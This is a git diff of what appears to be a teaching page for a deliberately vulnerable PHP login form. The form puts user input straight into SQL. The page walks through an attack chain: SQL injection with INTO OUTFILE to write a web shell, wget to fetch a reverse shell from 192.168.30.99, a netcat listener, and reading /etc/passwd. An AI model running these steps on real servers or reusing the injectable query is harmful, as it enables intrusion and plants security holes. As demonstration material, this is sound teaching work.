@@ -3,24 +3,25 @@
     require 'functions.php';
     require 'config.php';
 
-    $username = $_GET['username'] ?? null;
-    $password = $_GET['password'] ?? null;
+    $username = $_POST['username'] ?? null;
+    $password = $_POST['password'] ?? null;
 
-    $sql = "SELECT * FROM user WHERE username='$username'";
+    $sql = "SELECT * FROM user WHERE username='$username' AND password=MD5('$password')";
 
-    try {
+    if ($username) {
         $stmt = $db->prepare($sql);
         $stmt->execute();
-    } catch(PDOException $ex) {
-        echo "Some error occured: $sql\n";
-        dd($ex->getMessage());
+
+        // Rather than process login, we're just going to dump output for this example.
+        $result = $stmt->fetch();
+    
+        if ($result) {
+            echo "Welcome, ". $result['first_name'] ." ". $result['last_name'] .".";
+            exit;
+        } else {
+            $flash = 'Incorrect username or password';
+        }
     }
-
-    if (isset($_GET['username'])) {
-        $results = $stmt->fetchAll();
-    }
-
-
 
 ?>
 
@@ -28,55 +29,108 @@
     <head>
         <title>SQL Injection Example</title>
         <link rel="stylesheet" href="css/style.css" />
+        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
     </head>
     <body>
 		<div class="container">
 			<h2>Insecure webform</h2>
 			<p>
-			    This is a web form that is insecure in the frontend and backend. It doesn't actually attempt to login but is open to SQL Injection which is explained with the examples below.
+                This is a web form that that doesn't cleanse the variables in the backend. Follow the instructions to gain shell access to the server.</p>
 			</p>
-			
-			<p>
-			    <h6>Use the `into outfile` MySQL command to create a PHP script on the server that will run our commands</h6>
-			    <a href="http://<?= HOST ?>/login.php?username=damien%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22';'">http://<?= HOST ?>/login.php?username=damien';select "&lt;?php system($_GET['cmd']);" into outfile "/var/www/web/images/cmd.php"';</a>
-			</p>
+        
+        <h3>Login Form</h3>
+        <form method="POST" action="">
 
-			<br />
-			
-			<p>
-			    <h6>Use the newly created script to download a reverse shell</h6>
-			    <a href="http://<?= HOST ?>/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
-			</p>
+            <?php if ($flash) : ?>
+               <div class="flash"><?= $flash ?></div>
+            <?php endif ?>
 
-			<br />
-			
-			<p>
-			    <h6>Change the permissions on the reverse shell to make it executable</h6>
-			    <a href="http://<?= HOST ?>/images/cmd.php?cmd=chmod%20777%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=chmod 777  /tmp/reverse-shell.py</a>
-			</p>
+            <dl>
+                <dt>Username</dt><dd><input type="text" name="username" value="<?= $_POST['username'] ?? '' ?>" /></dd>
+                <dt>Password</dt><dd><input type="text" name="password" value="<?= $_POST['password'] ?? '' ?>" id="password-input" /></dd>
+            </dl>
+            <input type="submit" name="submit" value="submit" />
+        </form>
 
-			<br />
-			
-			<p>
-			    <h6>Run the downloaded reverse shell</h6>
-			    <a href="http://<?= HOST ?>/images/cmd.php?cmd=python%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=python /tmp/reverse-shell.py</a>
-			</p>
-		</div>
-		
-		<hr />
-		
-		<form method="GET" action="">
-		    Username: <input type="text" name="username" /><br />
-		    Password: <input type="password" name="password" /><br />
-		</form>
+        <br />
 
-		<?php if ($results) : ?>
-<?php die('what now'); ?>
-			<div class="container">
-				<?php dd($results); ?>
-			</div>
-			<?php else : ?>
-				<?php die('no results'); ?>
-		<?php endif; ?>
+        <div class="code-block">
+            <h4>Backend code</h4>
+            <p>
+                $username = $_POST['username'] ?? null;<br />
+                $password = $_POST['password'] ?? null;<br /><br />
+
+                $sql = "SELECT * FROM user WHERE username='$username' AND password=MD5('$password')";
+            </p>
+        </div>
+			
+        <div class="steps">
+            <h2>Step 1</h2>
+            <h4>Create malicious file on the host</h4>
+            <p>Use the <em>into outfile</em> MySQL command to create a PHP script on the server that will run our commands.</p>
+            <p>Password: <em class="input">mypass');SELECT "&lt;?php system($_GET['cmd']);" INTO OUTFILE "/var/www/web/images/system.php";'</em></p>
+            <p><strong>Note:</strong> We need to use cURL here as the opening PHP tag causes issues in the browser.</p>
+            <p><em class="input">curl -X POST "http://192.168.30.99/login.php" --data "username=damien&amp;password=mypass');SELECT \"&lt;?php system($_GET['cmd'])\" INTO OUTFILE \"/var/www/web/images/system.php\";'"</em></p>
+            <div class="code-block">
+                <h4>Resulting SQL</h4>
+                <p>
+                SELECT * FROM user WHERE username='damien' AND password=MD5('mypass');select "&lt;?php system(['cmd'])" INTO OUTFILE "/var/www/web/images/system.php";'')
+                </p>
+            </div>
+		</div>	
+
+        <div class="steps">
+            <h2>Step 2</h2>
+		    <h4> Use the newly created script to download a reverse shell</h4>
+		    <p><a href="http://<?= HOST ?>/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py" target="_blank">http://<?= HOST ?>/images/system.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
+            </p>
+        </div>
+			
+        <div class="steps">
+            <h2>Step 3</h2>
+			<h4>Change the permissions on the reverse shell to make it executable</h4>
+			<p>
+			    <a href="http://<?= HOST ?>/images/system.php?cmd=chmod%20777%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=chmod 777  /tmp/reverse-shell.py</a>
+			</p>
+        </div>
+
+        <div class="steps">
+            <h2>Step 4</h2>
+			<h4>Open a waiting network service on your host machine</h4>
+            <p>Open the network service on port 4444 using <a href="http://netcat.sourceforge.net/" target="_blank">netcat</a>.</p>
+            <div class="code-block">
+                <h4>Command to run</h4>
+                <p>
+                    nc -nlvp 4444
+                </p>
+            </div>
+        </div>
+			
+        <div class="steps">
+            <h2>Step 5</h2>
+			<h4>Run the downloaded reverse shell</h4>
+			<p>
+			    <a href="http://<?= HOST ?>/images/system.php?cmd=python%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=python /tmp/reverse-shell.py</a>
+			</p>
+        </div>
+
+        <div class="steps">
+            <h2>Completed</h2>
+            <h4>You should now be connected</h4>
+            <p>
+                The netcat command ran from the host machine should now be connected to the reverse shell. Try running commands such as `whoami` and `cat /etc/passwd`.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+          $('em.input').click(function() {
+            str = $(this).html();
+            $('#password-input').val(str);
+          });
+        }
+    </script>
+
     </body>
 </html>
